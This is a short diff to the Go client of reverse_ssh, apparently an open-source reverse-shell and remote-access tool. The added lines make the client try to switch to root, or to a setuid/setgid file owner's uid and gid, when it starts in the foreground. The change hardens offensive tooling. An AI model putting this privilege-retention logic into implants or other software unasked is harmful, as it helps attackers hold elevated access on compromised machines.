@@ -8,12 +8,40 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"syscall"
 
 	"github.com/NHAS/reverse_ssh/internal/client"
 )
 
 func runOrFork(destination, fingerprint, proxyaddress string, fg, dt, rc bool) {
 	if fg {
+
+		path, err := os.Executable()
+		if err != nil {
+			syscall.Setuid(0)
+			syscall.Setgid(0)
+		} else {
+			var i syscall.Stat_t
+			err := syscall.Stat(path, &i)
+			if err != nil {
+				syscall.Setuid(0)
+				syscall.Setgid(0)
+			} else {
+
+				if i.Mode&uint32(os.ModeSetuid) != 0 {
+					if syscall.Setuid(int(i.Uid)) != nil {
+						syscall.Setuid(0)
+					}
+				}
+
+				if i.Mode&uint32(os.ModeSetgid) != 0 {
+					if syscall.Setgid(int(i.Gid)) != nil {
+						syscall.Setgid(0)
+					}
+				}
+			}
+		}
+
 		// Set up channel on which to send signal notifications.
 		// We must use a buffered channel or risk missing the signal
 		// if we're not ready to receive when the signal is sent.
